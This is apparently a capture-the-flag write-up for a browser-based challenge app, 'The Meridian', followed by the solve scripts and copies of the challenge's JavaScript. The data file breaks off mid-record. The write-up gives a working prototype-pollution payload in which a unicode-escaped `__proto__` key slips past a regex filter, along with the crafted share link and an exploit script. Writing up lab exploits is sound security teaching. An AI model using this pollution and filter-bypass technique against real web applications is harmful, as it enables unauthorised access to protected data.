### Summary

The Meridian is a client-side single-page app, so the whole solve happens in the browser code. The vault opens from an operator descriptor `cfg.vault = {curators, rounds}`, which derives an AES-256-GCM key by hashing `bsalt` and the curators list. The share-link merge is a recursive `deepMerge` that follows a `__proto__` key onto `Object.prototype`, and the sanitizer only deletes an own `vault` property, so a polluted inherited `vault` survives. The WAF checks the raw link text for `__proto__`, which a `_` JSON escape evades. The correct descriptor is recovered from the registrar re-key memo hidden in the legacy console, and it is used both directly and through the share link to open the vault.

### Steps

Everything runs in the browser, and there is no server-side check. The commands use the instance's own JavaScript. The host is volatile, so replace it with the one you are given.

1. Fetch the client code. Unknown paths return the index page with HTTP 200, so only the scripts that `index.html` references are real.

   ```sh
   U=https://isfcrpesu-the-meridian.chals.io
   mkdir -p js
   for p in vendor/mcrypto.js assets/js/core.js data/meridian-data.js \
            assets/js/legacy/provenance-v2.js assets/js/app.js; do
     curl -sS "$U/$p" -o "js/$(echo $p | tr / _)"
   done
   ```

2. Read `core.js`. `openVault(cfg, vault)` needs `cfg.vault = {curators:[...], rounds:N}` with `rounds` between 1 and 20000. It computes the key as `sha256` applied `rounds` times to `vault.bsalt + ":" + curators.join("|")`, then decrypts `vault.blob` with AES-256-GCM. `sanitizeConfig` runs `delete cfg.vault` only when `hasOwnProperty(cfg, "vault")` is true, so an inherited `vault` passes. `buildConfig` merges the share link with a recursive `deepMerge` that writes `__proto__` onto `Object.prototype`. `parseStatePayload` blocks `/__proto__|constructor|prototype/i`, but only against the raw string, before `JSON.parse` runs.

3. Recover the operator descriptor. The legacy console (decommissioned 2021) stores its lines XOR-masked with the current registrar pepper `meridian::provenance::v3::do-not-share`. Unmasking `legacy.masked` with that pepper gives the re-key memo. The memo says:
   - `curators` is the curator of every piece whose certificate verifies against the v3 pepper, in accession order. The green gallery badge is not verification. The badge only checks that `sig` is 12 characters long.
   - `rounds` is `1000 + (sum of those pieces' accession years mod 4096)`.

   `scripts/analyze.js` runs the registrar audit and the unmask under both peppers:

   ```sh
   node scripts/analyze.js "$PWD/artifacts/js"
   ```

4. Apply the audit rule `sig == sha256(accession|title|curator|v3-pepper)[:12]` to the gallery records. Five pieces verify under v3: E. Vantar (1971), R. Oikawa (1984), H. Delacroix (1990), K. Adeyemi (2003) and S. Marchetti (2011). The years sum to 9959, `9959 mod 4096` is 1767, so `rounds` is 2767. `scripts/open_vault.js` derives the key from that descriptor and decrypts the vault. A valid GCM tag means the key is correct.

   ```sh
   node scripts/open_vault.js "$PWD/artifacts/js"
   # curators: ["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"]
   # years: 1971+1984+1990+2003+2011 = 9959 mod 4096 = 1767
   # rounds: 2767
   # vault state: open
   # FLAG: isfcr{REDACTED}
   ```

5. Deliver the descriptor through the real front end. `scripts/exploit_link.js` writes the `__proto__` key with `_` escapes, so the raw text does not contain the blocked substrings. The script then runs the same steps the app runs: `parseStatePayload`, `buildConfig` and `openVault`. The descriptor is not an own property of the config, so it reaches `openVault` only through the prototype.

   ```sh
   node scripts/exploit_link.js "$PWD/artifacts/js"
   ```

   The payload and the share link are:

   ```text
   {"__proto__":{"vault":{"curators":["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"],"rounds":2767}}}
   https://isfcrpesu-the-meridian.chals.io/#/vault?s=eyJcdTAwNWZcdTAwNWZwcm90b1x1MDA1Zlx1MDA1ZiI6eyJ2YXVsdCI6eyJjdXJhdG9ycyI6WyJFLiBWYW50YXIiLCJSLiBPaWthd2EiLCJILiBEZWxhY3JvaXgiLCJLLiBBZGV5ZW1pIiwiUy4gTWFyY2hldHRpIl0sInJvdW5kcyI6Mjc2N319fQ
   ```

   The script output confirms the path:

   ```text
   BLOCK regex hits raw text? false
   parseStatePayload accepted? true
   cfg own vault present (should be false, sanitized): false
   vault state via share-link pipeline: open
   FLAG: isfcr{REDACTED}
   ```

   Opening the share link in the app (`#/vault?s=...`) is the in-browser repro. The text check is only a guard, and it does not catch the escaped key.

### Scripts

#### scripts/analyze.js

Audits the gallery records under both peppers and unmasks the legacy console lines under the v3 and v2 peppers. It loads the three instance files from `artifacts/js` and prints the curators that verify under v3, which is the input the vault needs. Run it as `node scripts/analyze.js "$PWD/artifacts/js"` from the `work` directory.

```javascript
"use strict";
const path = require("path");
const fs = require("fs");
const JS = process.argv[2]; // scratch/js dir
globalThis.window = globalThis;
const M = require(path.join(JS, "vendor_mcrypto.js"));
globalThis.MCrypto = M;
const Core = require(path.join(JS, "assets_js_core.js"));
// load data (attaches window.__MERIDIAN__)
(0, eval)(fs.readFileSync(path.join(JS, "data_meridian-data.js"), "utf8"));
const D = globalThis.__MERIDIAN__;

const V3 = "meridian::provenance::v3::do-not-share";
const V2 = "meridian::provenance::v2::rotate-me";
function sign(ex, pep){ return M.bytesToHex(M.sha256(M.strToBytes(ex.accession+"|"+ex.title+"|"+ex.curator+"|"+pep))).slice(0,12); }

console.log("=== registrar audit per exhibit ===");
const auditV3 = [];
for (const ex of D.exhibits) {
  const badge = typeof ex.sig === "string" && ex.sig.length === 12;
  const okV3 = ex.sig && ex.sig.toLowerCase() === sign(ex, V3);
  const okV2 = ex.sig && ex.sig.toLowerCase() === sign(ex, V2);
  if (okV3) auditV3.push(ex.curator);
  console.log(`${ex.accession} ${badge?"badge":"    "} v3=${okV3?"Y":"."} v2=${okV2?"Y":"."}  ${ex.curator}`);
}
console.log("curators passing v3 audit:", JSON.stringify(auditV3));

console.log("\n=== legacy console unmask (v3 pepper) ===");
function unmask(masked, pep){
  const mb = M.b64ToBytes(masked), kb = M.strToBytes(pep), out = new Uint8Array(mb.length);
  for (let i=0;i<mb.length;i++) out[i]=mb[i]^kb[i%kb.length];
  return M.bytesToStr(out);
}
for (const pep of [V3, V2]) {
  console.log("-- pepper:", pep);
  for (const line of D.legacy.masked) { try { console.log("   ", JSON.stringify(unmask(line, pep))); } catch(e){ console.log("   <decode err>"); } }
}
```

#### scripts/open_vault.js

Applies the memo rule to the five verifying pieces, builds the descriptor `{curators, rounds}`, and calls `openVault` directly. It prints the flag when the GCM tag verifies. Run it as `node scripts/open_vault.js "$PWD/artifacts/js"`.

```javascript
"use strict";
const path = require("path"), fs = require("fs");
const JS = process.argv[2];
globalThis.window = globalThis;
const M = require(path.join(JS, "vendor_mcrypto.js"));
globalThis.MCrypto = M;
const Core = require(path.join(JS, "assets_js_core.js"));
(0, eval)(fs.readFileSync(path.join(JS, "data_meridian-data.js"), "utf8"));
const D = globalThis.__MERIDIAN__;

const V3 = "meridian::provenance::v3::do-not-share";
const sign = ex => M.bytesToHex(M.sha256(M.strToBytes(ex.accession+"|"+ex.title+"|"+ex.curator+"|"+V3))).slice(0,12);

const verified = D.exhibits.filter(ex => ex.sig && ex.sig.toLowerCase() === sign(ex)); // accession order
const curators = verified.map(ex => ex.curator);
const years = verified.map(ex => ex.year);
const rounds = 1000 + (years.reduce((a,b)=>a+b,0) % 4096);
console.log("curators:", JSON.stringify(curators));
console.log("years:", years.join("+"), "=", years.reduce((a,b)=>a+b,0), "mod 4096 =", years.reduce((a,b)=>a+b,0)%4096);
console.log("rounds:", rounds);

const descriptor = { curators, rounds };
const cfg = { vault: descriptor };          // openVault only reads cfg.vault
const v = Core.openVault(cfg, D.vault);
console.log("vault state:", v.state);
if (v.state === "open") console.log("FLAG:", v.text);
```

#### scripts/exploit_link.js

Builds the share link with the escaped `__proto__` key and replays the front-end path: decode the link, `parseStatePayload`, `buildConfig`, and `openVault`. It shows that the filter accepts the payload and that the polluted `vault` reaches `openVault`. Run it as `node scripts/exploit_link.js "$PWD/artifacts/js"`.

```javascript
"use strict";
const path = require("path"), fs = require("fs");
const JS = process.argv[2];
globalThis.window = globalThis;
const M = require(path.join(JS, "vendor_mcrypto.js"));
globalThis.MCrypto = M;
const Core = require(path.join(JS, "assets_js_core.js"));
(0, eval)(fs.readFileSync(path.join(JS, "data_meridian-data.js"), "utf8"));
const D = globalThis.__MERIDIAN__;

// descriptor from the memo rule
const descriptor = { curators: ["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"], rounds: 2767 };

// __proto__ written with _ escapes so the raw text dodges /__proto__|constructor|prototype/i
const payload = '{"\\u005f\\u005fproto\\u005f\\u005f":{"vault":' + JSON.stringify(descriptor) + '}}';
console.log("raw payload text:", payload);
console.log("BLOCK regex hits raw text?", /__proto__|constructor|prototype/i.test(payload));

// exactly what app.js does: b64url(payload) in #/collection?s=...
const b64url = Buffer.from(payload, "utf8").toString("base64").replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");
console.log("share link: #/vault?s=" + b64url);

// replay the app pipeline: decode -> parseStatePayload (the WAF) -> buildConfig -> openVault
function b64urlDecode(s){ s=s.replace(/-/g,"+").replace(/_/g,"/"); while(s.length%4)s+="="; return Buffer.from(s,"base64").toString("utf8"); }
const txt = b64urlDecode(b64url);
const link = Core.parseStatePayload(txt);
console.log("parseStatePayload accepted?", link !== null);
const cfg = Core.buildConfig(null, link);
console.log("cfg own vault present (should be false, sanitized):", Object.prototype.hasOwnProperty.call(cfg,"vault"));
console.log("cfg.vault inherited from prototype:", JSON.stringify(cfg.vault));
const v = Core.openVault(cfg, D.vault);
console.log("vault state via share-link pipeline:", v.state);
if (v.state === "open") console.log("FLAG:", v.text);
```

#### artifacts/js/vendor_mcrypto.js

Instance client library (SHA-256 and AES-256-GCM in plain JavaScript). The three scripts load it with `require`, and `assets_js_core.js` uses it for hashing and decryption. It is downloaded from the instance as `vendor/mcrypto.js`, and the vault copy keeps the file name in flattened form.

```javascript
/*
 * mcrypto.js — compact, dependency-free SHA-256 + AES-256-GCM.
 * Works in the browser (window.MCrypto) and Node (module.exports).
 * Only what The Meridian needs: sha256(bytes) and aesGcmDecrypt(key,iv,ct+tag,aad).
 * Also aesGcmEncrypt for build/test parity.
 */
(function (root, factory) {
  var M = factory();
  if (typeof module !== "undefined" && module.exports) module.exports = M;
  if (typeof window !== "undefined") window.MCrypto = M;
})(this, function () {
  "use strict";

  /* ---------- helpers ---------- */
  function u8(a){ return a instanceof Uint8Array ? a : new Uint8Array(a); }
  function strToBytes(s){ return new TextEncoder().encode(s); }
  function bytesToStr(b){ return new TextDecoder().decode(b); }
  function hexToBytes(h){ h=h.replace(/[^0-9a-fA-F]/g,""); var o=new Uint8Array(h.length/2); for(var i=0;i<o.length;i++)o[i]=parseInt(h.substr(i*2,2),16); return o; }
  function bytesToHex(b){ b=u8(b); var s=""; for(var i=0;i<b.length;i++)s+=(b[i]>>>4).toString(16)+(b[i]&15).toString(16); return s; }
  function b64ToBytes(s){
    if (typeof atob === "function"){ var bin=atob(s); var o=new Uint8Array(bin.length); for(var i=0;i<bin.length;i++)o[i]=bin.charCodeAt(i); return o; }
    return u8(Buffer.from(s,"base64"));
  }
  function bytesToB64(b){
    b=u8(b);
    if (typeof btoa === "function"){ var bin=""; for(var i=0;i<b.length;i++)bin+=String.fromCharCode(b[i]); return btoa(bin); }
    return Buffer.from(b).toString("base64");
  }
  function concat(){ var t=0,i,a=arguments; for(i=0;i<a.length;i++)t+=a[i].length; var o=new Uint8Array(t),p=0; for(i=0;i<a.length;i++){o.set(a[i],p);p+=a[i].length;} return o; }

  /* ---------- SHA-256 ---------- */
  var K=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
  function rotr(x,n){ return (x>>>n)|(x<<(32-n)); }
  function sha256(msg){
    msg=u8(msg);
    var l=msg.length, bl=l*8;
    var withOne=l+1;
    var k=(56-(withOne%64)+64)%64;
    var total=withOne+k+8;
    var m=new Uint8Array(total);
    m.set(msg); m[l]=0x80;
    // 64-bit big-endian length (bl fits < 2^32 here)
    var dv=new DataView(m.buffer);
    dv.setUint32(total-4, bl>>>0, false);
    dv.setUint32(total-8, Math.floor(bl/0x100000000), false);
    var H=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
    var w=new Uint32Array(64);
    for(var off=0;off<total;off+=64){
      for(var i=0;i<16;i++)w[i]=dv.getUint32(off+i*4,false);
      for(i=16;i<64;i++){
        var s0=rotr(w[i-15],7)^rotr(w[i-15],18)^(w[i-15]>>>3);
        var s1=rotr(w[i-2],17)^rotr(w[i-2],19)^(w[i-2]>>>10);
        w[i]=(w[i-16]+s0+w[i-7]+s1)>>>0;
      }
      var a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
      for(i=0;i<64;i++){
        var S1=rotr(e,6)^rotr(e,11)^rotr(e,25);
        var ch=(e&f)^((~e)&g);
        var t1=(h+S1+ch+K[i]+w[i])>>>0;
        var S0=rotr(a,2)^rotr(a,13)^rotr(a,22);
        var maj=(a&b)^(a&c)^(b&c);
        var t2=(S0+maj)>>>0;
        h=g;g=f;f=e;e=(d+t1)>>>0;d=c;c=b;b=a;a=(t1+t2)>>>0;
      }
      H[0]=(H[0]+a)>>>0;H[1]=(H[1]+b)>>>0;H[2]=(H[2]+c)>>>0;H[3]=(H[3]+d)>>>0;
      H[4]=(H[4]+e)>>>0;H[5]=(H[5]+f)>>>0;H[6]=(H[6]+g)>>>0;H[7]=(H[7]+h)>>>0;
    }
    var out=new Uint8Array(32),o=new DataView(out.buffer);
    for(i=0;i<8;i++)o.setUint32(i*4,H[i],false);
    return out;
  }

  /* ---------- AES (encrypt block; 256-bit key) ---------- */
  var SB=(function(){
    var p=1,q=1,sb=new Uint8Array(256);
    do{
      p=p^(p<<1)^(p&0x80?0x11b:0); p&=0xff;
      q^=q<<1; q^=q<<2; q^=q<<4; q&=0xff; if(q&0x80)q^=0x09;
      var x=q^((q<<1)|(q>>>7))^((q<<2)|(q>>>6))^((q<<3)|(q>>>5))^((q<<4)|(q>>>4)); x&=0xff;
      sb[p]=x^0x63;
    }while(p!==1);
    sb[0]=0x63; return sb;
  })();
  var RCON=[0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d];
  function xtime(a){ return ((a<<1)^((a&0x80)?0x11b:0))&0xff; }
  function mul(a,b){ var r=0; while(b){ if(b&1)r^=a; a=xtime(a); b>>=1; } return r&0xff; }
  function keyExpand256(key){
    var Nk=8,Nr=14,i,w=new Array(4*(Nr+1));
    for(i=0;i<Nk;i++)w[i]=[key[4*i],key[4*i+1],key[4*i+2],key[4*i+3]];
    for(i=Nk;i<4*(Nr+1);i++){
      var t=w[i-1].slice();
      if(i%Nk===0){ t.push(t.shift()); for(var j=0;j<4;j++)t[j]=SB[t[j]]; t[0]^=RCON[i/Nk-1]; }
      else if(i%Nk===4){ for(var j2=0;j2<4;j2++)t[j2]=SB[t[j2]]; }
      w[i]=[w[i-Nk][0]^t[0],w[i-Nk][1]^t[1],w[i-Nk][2]^t[2],w[i-Nk][3]^t[3]];
    }
    return w;
  }
  function encBlock(inp,w){
    var Nr=14,s=[[],[],[],[]],i;
    for(i=0;i<16;i++)s[i%4][(i/4)|0]=inp[i];
    function addRK(r){ for(var c=0;c<4;c++)for(var ro=0;ro<4;ro++)s[ro][c]^=w[r*4+c][ro]; }
    addRK(0);
    for(var round=1;round<Nr;round++){
      for(i=0;i<16;i++)s[i%4][(i/4)|0]=SB[s[i%4][(i/4)|0]];
      var t;
      t=s[1][0];s[1][0]=s[1][1];s[1][1]=s[1][2];s[1][2]=s[1][3];s[1][3]=t;
      t=s[2][0];var t2=s[2][1];s[2][0]=s[2][2];s[2][1]=s[2][3];s[2][2]=t;s[2][3]=t2;
      t=s[3][3];s[3][3]=s[3][2];s[3][2]=s[3][1];s[3][1]=s[3][0];s[3][0]=t;
      for(var c=0;c<4;c++){
        var a0=s[0][c],a1=s[1][c],a2=s[2][c],a3=s[3][c];
        s[0][c]=mul(a0,2)^mul(a1,3)^a2^a3;
        s[1][c]=a0^mul(a1,2)^mul(a2,3)^a3;
        s[2][c]=a0^a1^mul(a2,2)^mul(a3,3);
        s[3][c]=mul(a0,3)^a1^a2^mul(a3,2);
      }
      addRK(round);
    }
    for(i=0;i<16;i++)s[i%4][(i/4)|0]=SB[s[i%4][(i/4)|0]];
    var t;
    t=s[1][0];s[1][0]=s[1][1];s[1][1]=s[1][2];s[1][2]=s[1][3];s[1][3]=t;
    t=s[2][0];var t2=s[2][1];s[2][0]=s[2][2];s[2][1]=s[2][3];s[2][2]=t;s[2][3]=t2;
    t=s[3][3];s[3][3]=s[3][2];s[3][2]=s[3][1];s[3][1]=s[3][0];s[3][0]=t;
    addRK(Nr);
    var out=new Uint8Array(16);
    for(i=0;i<16;i++)out[i]=s[i%4][(i/4)|0];
    return out;
  }

  /* ---------- GCM ---------- */
  function gf_mul(X,Y){
    var Z=new Uint8Array(16), V=Y.slice();
    for(var i=0;i<128;i++){
      var bit=(X[i>>>3]>>>(7-(i&7)))&1;
      if(bit)for(var j=0;j<16;j++)Z[j]^=V[j];
      var lsb=V[15]&1;
      for(var k=15;k>0;k--)V[k]=((V[k]>>>1)|((V[k-1]&1)<<7))&0xff;
      V[0]=V[0]>>>1;
      if(lsb)V[0]^=0xe1;
    }
    return Z;
  }
  function ghash(H,aad,ct){
    var Y=new Uint8Array(16);
    function block(b){ for(var i=0;i<16;i++)Y[i]^=b[i]; Y=gf_mul(Y,H); }
    var i;
    for(i=0;i<aad.length;i+=16){ var b=new Uint8Array(16); b.set(aad.subarray(i,Math.min(i+16,aad.length))); block(b); }
    for(i=0;i<ct.length;i+=16){ var b2=new Uint8Array(16); b2.set(ct.subarray(i,Math.min(i+16,ct.length))); block(b2); }
    var len=new Uint8Array(16),dv=new DataView(len.buffer);
    dv.setUint32(4, (aad.length*8)>>>0, false);
    dv.setUint32(12, (ct.length*8)>>>0, false);
    block(len);
    return Y;
  }
  function incr(ctr){ for(var i=15;i>=12;i--){ ctr[i]=(ctr[i]+1)&0xff; if(ctr[i])break; } }
  function gctr(w,icb,inp){
    var out=new Uint8Array(inp.length), ctr=icb.slice();
    for(var i=0;i<inp.length;i+=16){
      var ks=encBlock(ctr,w);
      for(var j=0;j<16 && i+j<inp.length;j++)out[i+j]=inp[i+j]^ks[j];
      incr(ctr);
    }
    return out;
  }
  function ct_eq(a,b){ if(a.length!==b.length)return false; var r=0; for(var i=0;i<a.length;i++)r|=a[i]^b[i]; return r===0; }

  function aesGcm(key,iv,data,aad,decrypt,tagIn){
    key=u8(key); iv=u8(iv); aad=aad?u8(aad):new Uint8Array(0);
    var w=keyExpand256(key);
    var H=encBlock(new Uint8Array(16),w);
    var J0;
    if(iv.length===12){ J0=new Uint8Array(16); J0.set(iv); J0[15]=1; }
    else { J0=ghash(H,new Uint8Array(0),iv); } // simplified; we always use 12-byte IV
    var icb=J0.slice(); incr(icb);
    if(!decrypt){
      var ct=gctr(w,icb,u8(data));
      var S=ghash(H,aad,ct);
      var tag=gctr(w,J0,S);
      return {ct:ct, tag:tag};
    } else {
      var ct2=u8(data);
      var S2=ghash(H,aad,ct2);
      var tag2=gctr(w,J0,S2);
      if(!ct_eq(tag2,u8(tagIn)))return null;
      return gctr(w,icb,ct2);
    }
  }

  function aesGcmEncrypt(key,iv,plaintext,aad){
    var r=aesGcm(key,iv,plaintext,aad,false,null);
    return r; // {ct,tag}
  }
  function aesGcmDecrypt(key,iv,ct,tag,aad){
    return aesGcm(key,iv,ct,aad,true,tag); // Uint8Array or null
  }

  return {
    sha256:sha256, aesGcmEncrypt:aesGcmEncrypt, aesGcmDecrypt:aesGcmDecrypt,
    strToBytes:strToBytes, bytesToStr:bytesToStr, hexToBytes:hexToBytes, bytesToHex:bytesToHex,
    b64ToBytes:b64ToBytes, bytesToB64:bytesToB64, concat:concat
  };
});
```

#### artifacts/js/assets_js_core.js

Instance application core (config engine, provenance check, vault client). It defines `deepMerge`, `sanitizeConfig`, `parseStatePayload`, `buildConfig` and `openVault`, which are the functions the exploit depends on. The scripts load it as `assets_js_core.js` from the vault copy, and it is downloaded from `assets/js/core.js`.

```javascript
/*
 * The Meridian — application core (config engine, provenance, vault client).
 * Shared by the browser app and build tooling.
 */
(function (root, factory) {
  var C = factory(root.MCrypto || (typeof require === "function" && require("../../vendor/mcrypto.js")));
  if (typeof module !== "undefined" && module.exports) module.exports = C;
  if (typeof window !== "undefined") window.MeridianCore = C;
})(typeof globalThis !== "undefined" ? globalThis : this, function (M) {
  "use strict";

  // Provenance signing pepper (rotated 2021, see registrar ticket REG-2291).
  var PEPPER = "meridian::provenance::v3::do-not-share";

  var DEFAULT_CONFIG = {
    render:   { theme: "noir", locale: "en", motion: "full", grid: "salon" },
    features: { ambient: true, captions: true, hiContrast: false },
    access:   { tier: "guest" }
  };
  var FEATURE_ALLOWLIST = ["ambient", "captions", "hiContrast"];

  function isObj(x) { return x && typeof x === "object" && !Array.isArray(x); }

  // Recursive merge used to layer saved state + shared deep-links over defaults.
  function deepMerge(target, source) {
    if (!isObj(target)) target = {};
    if (!isObj(source)) return source;
    var keys = Object.keys(source);
    for (var i = 0; i < keys.length; i++) {
      var k = keys[i], sv = source[k];
      if (isObj(sv)) target[k] = deepMerge(isObj(target[k]) ? target[k] : {}, sv);
      else target[k] = sv;
    }
    return target;
  }

  // Public builds keep only allowlisted OWN feature flags, pin the tier,
  // and drop any OWN staff-only vault descriptor.
  function sanitizeConfig(cfg) {
    var clean = {}, src = cfg.features || {}, own = Object.keys(src);
    for (var i = 0; i < own.length; i++)
      if (FEATURE_ALLOWLIST.indexOf(own[i]) !== -1) clean[own[i]] = src[own[i]];
    cfg.features = clean;
    cfg.access = { tier: "guest" };
    if (Object.prototype.hasOwnProperty.call(cfg, "vault")) delete cfg.vault;
    return cfg;
  }

  // Deep-link payloads are screened before parsing (WAF rule MRD-7).
  var BLOCK = /__proto__|constructor|prototype/i;
  function parseStatePayload(text) {
    if (typeof text !== "string" || BLOCK.test(text)) return null;
    try { var o = JSON.parse(text); return isObj(o) ? o : null; } catch (e) { return null; }
  }

  function buildConfig(savedState, deepLink) {
    var cfg = deepMerge({}, DEFAULT_CONFIG);
    if (savedState) cfg = deepMerge(cfg, savedState);
    if (deepLink) cfg = deepMerge(cfg, deepLink);
    return sanitizeConfig(cfg);
  }

  // Gallery badge: "Verified" is shown for any record carrying a certificate.
  function hasCertificate(ex) { return typeof ex.sig === "string" && ex.sig.length === 12; }

  // Registrar check used by the audit export (not wired to the gallery UI).
  function registrarVerify(ex, pepper) {
    var msg = ex.accession + "|" + ex.title + "|" + ex.curator + "|" + (pepper || PEPPER);
    return typeof ex.sig === "string" &&
      ex.sig.toLowerCase() === M.bytesToHex(M.sha256(M.strToBytes(msg))).slice(0, 12);
  }

  // Legacy staff console (decommissioned). Unlocks on the features.vault flag.
  function staffConsoleUnlocked(cfg) { var f = cfg.features || {}; return f.vault === true; }
  function unmask(masked) {
    var mb = M.b64ToBytes(masked), kb = M.strToBytes(PEPPER), out = new Uint8Array(mb.length);
    for (var i = 0; i < mb.length; i++) out[i] = mb[i] ^ kb[i % kb.length];
    return M.bytesToStr(out);
  }
  function staffConsole(cfg, legacy) {
    if (!staffConsoleUnlocked(cfg)) return null;
    return { banner: legacy.banner, lines: legacy.masked.map(unmask) };
  }

  // Vault client. Reads an operator descriptor { curators:[...], rounds:N }.
  function openVault(cfg, vault) {
    var d = cfg.vault;
    if (!isObj(d) || !Array.isArray(d.curators) || typeof d.rounds !== "number") return { state: "sealed" };
    if (d.rounds < 1 || d.rounds > 20000) return { state: "sealed" };
    var h = M.strToBytes(vault.bsalt + ":" + d.curators.join("|"));
    for (var i = 0; i < d.rounds; i++) h = M.sha256(h);
    var pt = M.aesGcmDecrypt(h, M.b64ToBytes(vault.blob.iv), M.b64ToBytes(vault.blob.ct),
                             M.b64ToBytes(vault.blob.tag), M.strToBytes(vault.aad));
    return pt ? { state: "open", text: M.bytesToStr(pt) } : { state: "rejected" };
  }

  return {
    DEFAULT_CONFIG: DEFAULT_CONFIG, deepMerge: deepMerge, sanitizeConfig: sanitizeConfig,
    parseStatePayload: parseStatePayload, buildConfig: buildConfig,
    hasCertificate: hasCertificate, registrarVerify: registrarVerify,
    staffConsole: staffConsole, openVault: openVault
  };
});
```

#### artifacts/js/data_meridian-data.js

Instance data file. It holds the gallery records (accession, curator, year, signature), the encrypted vault (`bsalt`, `aad`, IV, ciphertext and tag), and the masked legacy console lines. The analysis scripts read the records and the vault from it. It contains no plaintext flag.

```javascript
/* The Meridian — collection snapshot (build 2024.11-public) */
window.__MERIDIAN__ = {
 "build": "2024.11-public",
 "exhibits": [
  {
   "accession": "MRD-1962-0007",
   "title": "Ferrotype Study",
   "curator": "Unattributed",
   "year": 1962,
   "medium": "tintype",
   "dims": "40 × 30 cm",
   "note": "attribution pending",
   "blurb": "A small tintype of a harbour at dusk; the plate is scratched along its lower third.",
   "room": "North Hall"
  },
  {
   "accession": "MRD-1968-0002",
   "title": "First Light",
   "curator": "A. Brenner",
   "year": 1968,
   "medium": "gelatin silver",
   "dims": "47 × 35 cm",
   "note": "",
   "blurb": "Brenner's earliest surviving exposure, made on expired Agfa stock from a lighthouse gallery.",
   "room": "Salt Room",
   "sig": "8c2c72e7c26f"
  },
  {
   "accession": "MRD-1971-0148",
   "title": "Halcyon Drift",
   "curator": "E. Vantar",
   "year": 1971,
   "medium": "gelatin silver",
   "dims": "54 × 40 cm",
   "note": "",
   "blurb": "Long exposure of a ferry wake. Vantar printed only three copies; this is the second.",
   "room": "Umbra Wing",
   "sig": "e61be53be50d"
  },
  {
   "accession": "MRD-1977-0333",
   "title": "Basalt Hymn",
   "curator": "D. Ferreira",
   "year": 1977,
   "medium": "pigment",
   "dims": "61 × 45 cm",
   "note": "certificate present",
   "blurb": "Columnar basalt photographed under sodium light, printed with iron pigments.",
   "room": "Annex",
   "sig": "5b8f02ade852"
  },
  {
   "accession": "MRD-1984-0912",
   "title": "Cold Cathode Nocturne",
   "curator": "R. Oikawa",
   "year": 1984,
   "medium": "c-print",
   "dims": "68 × 50 cm",
   "note": "provenance disputed by rival house",
   "blurb": "A shuttered pachinko parlour lit only by its own signage.",
   "room": "North Hall",
   "sig": "e7d97656f18a"
  },
  {
   "accession": "MRD-1990-0025",
   "title": "Salt Meridian",
   "curator": "H. Delacroix",
   "year": 1990,
   "medium": "dye transfer",
   "dims": "75 × 55 cm",
   "note": "",
   "blurb": "Salt flats bisected by a survey line; the horizon is intentionally tilted 1.5 degrees.",
   "room": "Salt Room",
   "sig": "c70f19844910"
  },
  {
   "accession": "MRD-1995-0642",
   "title": "Verdigris",
   "curator": "P. Ashworth",
   "year": 1995,
   "medium": "c-print",
   "dims": "82 × 60 cm",
   "note": "verified provenance",
   "blurb": "Oxidised copper roofing, shot from a crane at the old telegraph exchange.",
   "room": "Umbra Wing",
   "sig": "6f692a734053",
   "provenance": "cert:76667370657b636530693361346170335f6379346468335f6a34665f6e5f7330657433656c7d"
  },
  {
   "accession": "MRD-1999-0500",
   "title": "Millennium Static",
   "curator": "J. Prochazka",
   "year": 1999,
   "medium": "pigment",
   "dims": "89 × 65 cm",
   "note": "",
   "blurb": "Television snow re-photographed for 24 hours on the last night of 1999.",
   "room": "Annex",
   "sig": "adec041df9c8"
  },
  {
   "accession": "MRD-2003-0777",
   "title": "Umbra Fold VII",
   "curator": "K. Adeyemi",
   "year": 2003,
   "medium": "gelatin silver",
   "dims": "96 × 70 cm",
   "note": "",
   "blurb": "Seventh of the Umbra Fold series: paper folded, exposed, unfolded, exposed again.",
   "room": "North Hall",
   "sig": "a758ba5927a1"
  },
  {
   "accession": "MRD-2008-0119",
   "title": "Null Horizon",
   "curator": "T. Volkov",
   "year": 2008,
   "medium": "pigment",
   "dims": "43 × 75 cm",
   "note": "",
   "blurb": "A horizon line removed entirely in the darkroom; the sea and sky share one tone.",
   "room": "Salt Room",
   "sig": "fdf35e6f8829"
  },
  {
   "accession": "MRD-2011-0410",
   "title": "Quiet Aperture",
   "curator": "S. Marchetti",
   "year": 2011,
   "medium": "c-print",
   "dims": "50 × 30 cm",
   "note": "flagged for re-appraisal (2018)",
   "blurb": "A pinhole camera left in an empty chapel for eleven weeks.",
   "room": "Umbra Wing",
   "sig": "1282be234cc2"
  },
  {
   "accession": "MRD-2016-0808",
   "title": "Grain / Noise",
   "curator": "M. Søndergaard",
   "year": 2016,
   "medium": "pigment",
   "dims": "57 × 35 cm",
   "note": "",
   "blurb": "Enlargement of a single silver grain, printed at 4 metres.",
   "room": "Annex",
   "sig": "1a66cb942552"
  },
  {
   "accession": "MRD-2020-0031",
   "title": "Isolation Study",
   "curator": "L. Nakamura",
   "year": 2020,
   "medium": "c-print",
   "dims": "64 × 40 cm",
   "note": "",
   "blurb": "Apartment windows photographed nightly from the same balcony during lockdown.",
